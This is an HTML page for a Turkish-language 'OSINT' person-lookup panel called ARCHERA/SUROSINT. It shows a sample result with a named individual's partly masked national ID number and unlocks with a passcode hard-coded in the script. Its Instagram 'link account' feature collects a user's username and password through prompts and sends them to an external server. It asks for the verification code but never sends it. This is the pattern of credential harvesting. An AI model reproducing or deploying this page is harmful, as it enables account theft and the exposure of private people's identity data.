<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ARCHERA | OSINT</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;800&display=swap" rel="stylesheet">
    <style>
        /* Senin Orijinal STORM Tasarımın */
        :root { --accent: #00d2ff; --bg: #050a15; --card-bg: rgba(10, 25, 49, 0.6); --border: rgba(0, 210, 255, 0.2); }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Outfit', sans-serif; }
        body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; }
        
        /* Auth Gate (Resim 20) */
        #auth-gate { position: fixed; inset: 0; z-index: 1000; background: var(--bg); display: flex; align-items: center; justify-content: center; padding: 20px; }
        .storm-card { width: 100%; max-width: 400px; background: var(--card-bg); border: 1px solid var(--border); border-radius: 25px; padding: 30px; text-align: center; backdrop-filter: blur(10px); }
        .logo-img { width: 80px; margin-bottom: 15px; }
        
        /* Main UI (Resim 9, 10, 11) */
        #panel { display: none; height: 100vh; flex-direction: column; }
        .top-nav { padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); }
        .content { flex: 1; overflow-y: auto; padding: 20px; padding-bottom: 100px; }
        .storm-item { background: var(--card-bg); border-radius: 20px; padding: 20px; border-left: 4px solid var(--accent); margin-bottom: 15px; border-top: 1px solid var(--border); }
        
        .key-input { width: 100%; background: rgba(0,0,0,0.3); border: 1px solid var(--border); padding: 15px; border-radius: 12px; color: var(--accent); margin-bottom: 15px; outline: none; text-align: center; }
        .btn-storm { width: 100%; padding: 15px; border-radius: 12px; border: none; background: linear-gradient(90deg, #0072ff, #00d2ff); color: #fff; font-weight: 800; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }

        .bottom-bar { position: fixed; bottom: 0; width: 100%; height: 80px; background: rgba(5, 10, 21, 0.95); border-top: 1px solid var(--border); display: flex; justify-content: space-around; align-items: center; }
        .nav-link { color: #5b7a9d; text-align: center; font-size: 10px; text-decoration: none; cursor: pointer; }
        .nav-link.active { color: var(--accent); }
        .nav-link i { font-size: 20px; margin-bottom: 5px; }

        #loader { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 2000; flex-direction: column; align-items: center; justify-content: center; }
        .spin { width: 40px; height: 40px; border: 3px solid var(--border); border-top-color: var(--accent); border-radius: 50%; animation: s 1s infinite linear; }
        @keyframes s { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loader"><div class="spin"></div><p style="color:var(--accent); margin-top:15px; font-size:12px; letter-spacing:2px;">SİSTEME SIZILIYOR...</p></div>

    <div id="auth-gate">
        <div class="storm-card">
            <img src="24841.jpg" class="logo-img">
            <h1 style="font-family:'Orbitron'; font-size:24px; letter-spacing:4px; color:#fff;">SUROSINT</h1>
            <p style="font-size:10px; color:#5b7a9d; margin-bottom:25px;">VIRTUAL INTELLIGENCE INTERFACE</p>
            <input type="password" id="gate-key" class="key-input" placeholder="••••">
            <button onclick="unlock()" class="btn-storm">SİSTEME GİR <i class="fas fa-arrow-right"></i></button>
        </div>
    </div>

    <div id="panel">
        <div class="top-nav">
            <div style="display:flex; align-items:center; gap:10px;">
                <img src="24841.jpg" style="width:30px; border-radius:8px;">
                <span style="font-weight:800; font-size:14px;">ARCHERA <span style="color:#5b7a9d; font-size:10px; font-weight:300;">v4.0.2-STORM</span></span>
            </div>
            <i class="fas fa-signal" style="color:var(--accent); font-size:12px;"></i>
        </div>

        <div class="content">
            <div id="tab-sorgu" class="tab-item">
                <div class="storm-item">
                    <input type="text" placeholder="test" class="key-input" style="text-align:left;">
                    <button class="btn-storm" style="padding:10px;">SORGULA</button>
                </div>
                <div class="storm-item">
                    <p style="color:#5b7a9d; font-size:12px; margin-bottom:10px;">SONUÇLAR:</p>
                    <div id="osint-res">
                        <p><b>AD SOYAD:</b> ABDULKADIR POLAT</p>
                        <p><b>TC NO:</b> 428*********</p>
                    </div>
                </div>
            </div>

            <div id="tab-hesaplar" class="tab-item" style="display:none;">
                <div class="storm-item" style="border-left-color: #e1306c;">
                    <h3 style="margin-bottom:15px;">OTOMASYON HESABI</h3>
                    <button onclick="handleLoginFlow()" class="btn-storm" style="background:#e1306c;">INSTAGRAM BAĞLA</button>
                </div>
                <div id="tunnel-status"></div>
            </div>
        </div>

        <div class="bottom-bar">
            <div class="nav-link active" onclick="showTab('tab-sorgu', this)"><i class="fas fa-search"></i><br>SORGULA</div>
            <div class="nav-link" onclick="showTab('tab-hesaplar', this)"><i class="fas fa-users"></i><br>HESAPLAR</div>
            <div class="nav-link"><i class="fas fa-database"></i><br>DATABASE</div>
            <div class="nav-link"><i class="fas fa-robot"></i><br>AI CHAT</div>
        </div>
    </div>

    <script>
        const RENDER_URL = "https://surosint.onrender.com";

        function unlock() {
            if(document.getElementById('gate-key').value === "baba") {
                document.getElementById('auth-gate').style.display = 'none';
                document.getElementById('panel').style.display = 'flex';
            } else { alert("KEY HATALI!"); }
        }

        function showTab(id, el) {
            document.querySelectorAll('.tab-item').forEach(t => t.style.display = 'none');
            document.querySelectorAll('.nav-link').forEach(n => n.classList.remove('active'));
            document.getElementById(id).style.display = 'block';
            el.classList.add('active');
        }

        async function handleLoginFlow() {
            const user = prompt("Instagram Kullanıcı Adı:");
            const pass = prompt("Şifre:");
            if(!user || !pass) return;

            document.getElementById('loader').style.display = 'flex';

            try {
                const response = await fetch(`${RENDER_URL}/api/v4/auth/link`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ "username": user, "password": pass, "verification_code": "" })
                });
                const res = await response.json();
                document.getElementById('loader').style.display = 'none';

                if(res.status === "challenge") {
                    const dummy = prompt(res.message); 
                    if(dummy) {
                        document.getElementById('loader').style.display = 'flex';
                        const retry = await fetch(`${RENDER_URL}/api/v4/auth/link`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ "username": user, "password": pass, "verification_code": "confirmed" })
                        });
                        const final = await retry.json();
                        document.getElementById('loader').style.display = 'none';
                        alert(final.message);
                    }
                } else { alert(res.message); }
            } catch (e) { document.getElementById('loader').style.display = 'none'; alert("Sunucu Hatası!"); }
        }
    </script>
</body>
</html>
